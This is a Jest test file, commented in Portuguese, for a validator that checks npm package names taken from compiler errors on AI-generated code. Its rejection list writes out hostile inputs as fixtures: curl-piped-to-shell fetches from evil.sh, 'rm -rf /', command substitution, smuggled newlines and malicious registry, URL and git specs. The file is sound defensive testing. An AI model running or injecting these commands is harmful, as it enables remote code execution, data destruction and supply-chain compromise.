import { isSafeNpmPackageName } from '../src/generation/npm-safe';

/**
 * Os nomes chegam de erros do tsc sobre código gerado por IA — entrada não
 * confiável. Estes testes são a prova de que nada além de um nome de pacote npm
 * legítimo atravessa (achado P0-02 da auditoria de segurança de 2026-07-31).
 */
describe('isSafeNpmPackageName — aceita pacote npm legítimo', () => {
  const validos = [
    'pg',
    'ioredis',
    'mongodb',
    '@aws-sdk/client-dynamodb',
    '@azure/service-bus',
    '@google-cloud/firestore',
    'lodash.merge',
    'some-pkg_name',
    '@scope/a',
  ];
  it.each(validos)('aceita %s', pkg => {
    expect(isSafeNpmPackageName(pkg)).toBe(true);
  });
});

describe('isSafeNpmPackageName — rejeita injeção e specs perigosos', () => {
  const invalidos: Array<[string, string]> = [
    ['pg; curl evil.sh | sh', 'comando encadeado com ;'],
    ['pg && rm -rf /', 'comando encadeado com &&'],
    ['pg | tee /tmp/x', 'pipe'],
    ['$(curl evil.sh)', 'substituição de comando'],
    ['`whoami`', 'backtick'],
    ['pg > /etc/passwd', 'redirecionamento'],
    ['pg meu-outro-pacote', 'espaço (dois pacotes num argumento)'],
    ['--registry=http://evil.example', 'flag disfarçada de pacote'],
    ['-g', 'flag curta'],
    ['../../../etc/passwd', 'caminho relativo'],
    ['./local-evil', 'caminho local'],
    ['/abs/path', 'caminho absoluto'],
    ['http://evil.example/pkg.tgz', 'URL http'],
    ['https://evil.example/pkg.tgz', 'URL https'],
    ['file:../evil', 'spec file:'],
    ['git+ssh://git@evil/x.git', 'spec git'],
    ['pg@file:../evil', 'spec de versão apontando para path'],
    ['pg@1.2.3', 'spec de versão (deve vir sem versão)'],
    ['_oculto', 'começa com underscore'],
    ['.oculto', 'começa com ponto'],
    ['PACOTE', 'maiúsculas (npm não aceita)'],
    ['pacote\nnpm install evil', 'quebra de linha'],
    ['pkg\tinject', 'tab'],
    ['', 'vazio'],
    ['a'.repeat(215), 'acima de 214 chars'],
  ];
  it.each(invalidos)('rejeita %s (%s)', pkg => {
    expect(isSafeNpmPackageName(pkg)).toBe(false);
  });

  it('rejeita valores que não são string', () => {
    expect(isSafeNpmPackageName(undefined)).toBe(false);
    expect(isSafeNpmPackageName(null)).toBe(false);
    expect(isSafeNpmPackageName(42)).toBe(false);
    expect(isSafeNpmPackageName({ toString: () => 'pg' })).toBe(false);
  });
});
